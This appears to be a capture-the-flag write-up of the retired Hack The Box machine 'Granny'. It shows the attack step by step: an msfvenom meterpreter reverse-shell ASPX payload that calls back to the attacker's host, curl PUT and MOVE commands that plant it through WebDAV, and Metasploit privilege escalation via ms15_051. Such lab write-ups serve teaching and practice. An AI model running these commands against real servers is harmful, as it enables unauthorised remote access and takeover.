---
title: Granny Hackthebox Writeup
date: 2021-01-31 16:00:00 +0530
categories: [Hackthebox, Retired]
tags: [windows,http methods,iis 6.0,aspx,metasploit]     # TAG names should always be lowercase
image: /assets/img/granny-hackthebox/granny-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Granny:~$


Column | Details
------------ | -------------
Name | Granny
IP | 10.10.10.15
Points | 20
Os | Windows
Difficult | Low
Creator | [cha4p](https://www.hackthebox.eu/home/users/profile/1)
Out on | 12th April 2017

# Summary:~$

* Discovering the new host and scanning for open ports.
* `PUT,MOVE` were on of the HTTP Methods allowed.
* Outdated version of IIS is running which allowed code execution by `PUT` and `MOVE` commands
* Got `Root` using `local-exploit-suggester` on metasploit.

# Starting:~$

## Nmap

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/granny-hackthebox/nmap-automator-1.png)

Let's access `Port 80`.

___
![](/assets/img/granny-hackthebox/port-80-2.png)

I straight jumped to what I saw i.e. the `HTTP Methods allowed`, in which *PUT* and *MOVE* were one of them.

Using `davtest` to check the extensions which can be uploaded.

**Command**: *davtest -url http://10.10.10.15*

___
![](/assets/img/granny-hackthebox/davtest-command-4.png)

It doesn't allow `aspx` and `asp` but allows `txt`.

So I thought to create a msfvenom shell with `aspx` extension and rename it to `txt` extension while sending it to the server via `PUT` command and again renaming it to `aspx` extension by using `MOVE` command.

**msfvenom command**: *msfvenom -p windows/meterpreter/reverse_tcp -f aspx LHOST=10.10.X.X LPORT=1234 -o shell.aspx*

**renaming command**: *mv shell.aspx shell.txt*

**PUT command**: *curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txt*

**MOVE command**: *curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' http://10.10.10.15/shell.txt*

___
![](/assets/img/granny-hackthebox/msfvenom-commands-2.png)

Accessing `http://10.10.10.15/shell.aspx` and listening on `multi/handler` on metasploit.

**Metasploit command**:

___
![](/assets/img/granny-hackthebox/meterpreter-shell-1.png)

Getting shell:

___
![](/assets/img/granny-hackthebox/got-shell-3.png)

I used `local_exploit_sugester` on metasploit to escalate the privileges.

___
![](/assets/img/granny-hackthebox/exploit-suggester-4.png)

Using `windows/local/ms15_051_client_copy_image`.

___
![](/assets/img/granny-hackthebox/escalating-privs-5.png)

Got `Root`.

___
![](/assets/img/granny-hackthebox/got-root-6.png)
